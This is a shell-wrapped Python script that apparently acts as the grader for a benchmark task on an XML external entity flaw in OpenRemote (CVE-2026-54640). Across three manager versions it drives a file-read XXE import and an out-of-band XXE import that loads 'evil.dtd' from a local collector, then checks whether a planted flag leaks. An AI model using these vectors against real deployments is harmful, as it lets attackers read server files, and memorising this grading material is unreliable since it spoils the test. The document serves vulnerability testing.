#!/bin/sh
# GATE_DRIVER for PCBV2-0159 (OpenRemote XXE, CVE-2026-54640).
# No compose profiles: single manager service version-switched via MANAGER_VERSION env.
# Deploys V0→V1→V2 sequentially, runs original/residual vectors per version.
set -u

FLAG="${PCB_FLAG:-PCBFLAG_test}"
MGR_PORT="${MGR_PORT:-18080}"
COLL_PORT="${COLLECTOR_PORT:-18085}"

python3 -c "
import sys, os, time, subprocess, json

sys.path.insert(0, '.')
sys.path.insert(0, 'poc')
sys.path.insert(0, '_heldout')
import orlib

FLAG = os.environ.get('PCB_FLAG', 'PCBFLAG_test')
MGR_PORT = os.environ.get('MGR_PORT', '18080')
COLL_PORT = os.environ.get('COLLECTOR_PORT', '18085')
BASE = f'http://127.0.0.1:{MGR_PORT}'
COLL = f'http://127.0.0.1:{COLL_PORT}'
VERSIONS = {'v0': '1.21.0', 'v1': '1.22.0', 'v2': '1.24.2'}

def compose(*args, ver=None):
    env = dict(os.environ)
    if ver:
        env['MANAGER_VERSION'] = ver
    return subprocess.run(['docker', 'compose'] + list(args),
                          env=env, capture_output=True, text=True, timeout=600)

def teardown():
    for v in VERSIONS.values():
        compose('down', '-v', '--remove-orphans', ver=v)
    compose('down', '-v', '--remove-orphans')

def deploy(version_tag):
    teardown()
    r = compose('up', '-d', ver=version_tag)
    if r.returncode != 0:
        print(f'compose up failed for {version_tag}: {r.stderr[-500:]}', file=sys.stderr)
        return False
    deadline = time.time() + 600
    while time.time() < deadline:
        try:
            import urllib.request
            urllib.request.urlopen(f'{BASE}/auth', timeout=10)
            break
        except Exception:
            time.sleep(5)
    else:
        print(f'manager not ready for {version_tag}', file=sys.stderr)
        return False
    # Plant flag
    subprocess.run(['docker', 'compose', 'exec', '-T', 'manager',
                     'sh', '-c', f'printf \"%s\" \"{FLAG}\" > /flag'],
                    env={**os.environ, 'MANAGER_VERSION': version_tag},
                    capture_output=True, timeout=30)
    time.sleep(3)
    return True

def original_vector():
    try:
        token = orlib.get_token(BASE)
        agent_id = orlib.create_velbus_agent(BASE, token, host='collector', port=8000)
        time.sleep(8)
        status, assets = orlib.do_import(BASE, token, agent_id,
                                          orlib.build_velbus_payload('file:///flag'),
                                          name='VelbusProject.vlp')
        if isinstance(assets, list):
            for a in assets:
                nm = a.get('asset', {}).get('name', '') or ''
                if nm.startswith('PCBFLAG:'):
                    return nm[len('PCBFLAG:'):]
    except Exception as e:
        print(f'original_vector error: {e}', file=sys.stderr)
    return None

def residual_vector():
    try:
        token = orlib.get_token(BASE)
        agent_id = orlib.create_knx_agent(BASE, token, host='10.255.255.1')
        time.sleep(8)
        orlib.collector_reset(COLL)
        orlib.do_import(BASE, token, agent_id,
                        orlib.build_knx_oob_payload('http://collector:8000/evil.dtd'),
                        name='knx-import-testproject.knxproj')
        time.sleep(3)
        for line in orlib.collector_hits(COLL).splitlines():
            if line.startswith('LEAK f='):
                return line[len('LEAK f='):].strip()
    except Exception as e:
        print(f'residual_vector error: {e}', file=sys.stderr)
    return None

edges = {}
try:
    # Edge 1: original on V0
    if deploy(VERSIONS['v0']):
        got = original_vector()
        edges['seed_v0_reaches'] = (got == FLAG)
        print(f'  seed@v0: got={got!r} flag={FLAG[:16]}...', file=sys.stderr)
    else:
        edges['seed_v0_reaches'] = False

    # Edge 2: original on V1
    if deploy(VERSIONS['v1']):
        got = original_vector()
        edges['seed_v1_blocked'] = (got is None or got != FLAG)
        print(f'  seed@v1: got={got!r} -> blocked={edges[\"seed_v1_blocked\"]}', file=sys.stderr)

        # Edge 3: residual on V1 (reuse V1 deployment)
        got = residual_vector()
        edges['residual_v1_reaches'] = (got == FLAG)
        print(f'  residual@v1: got={got!r}', file=sys.stderr)
    else:
        edges['seed_v1_blocked'] = False
        edges['residual_v1_reaches'] = False

    # Edge 4: residual on V2
    if deploy(VERSIONS['v2']):
        got = residual_vector()
        edges['residual_v2_blocked'] = (got is None or got != FLAG)
        print(f'  residual@v2: got={got!r} -> blocked={edges[\"residual_v2_blocked\"]}', file=sys.stderr)
    else:
        edges['residual_v2_blocked'] = False

finally:
    teardown()

passed = all(edges.get(e, False) for e in ['seed_v0_reaches','seed_v1_blocked','residual_v1_reaches','residual_v2_blocked'])
result = {**edges, 'passed': passed}
json.dump(result, sys.stdout, indent=2)
print()
"
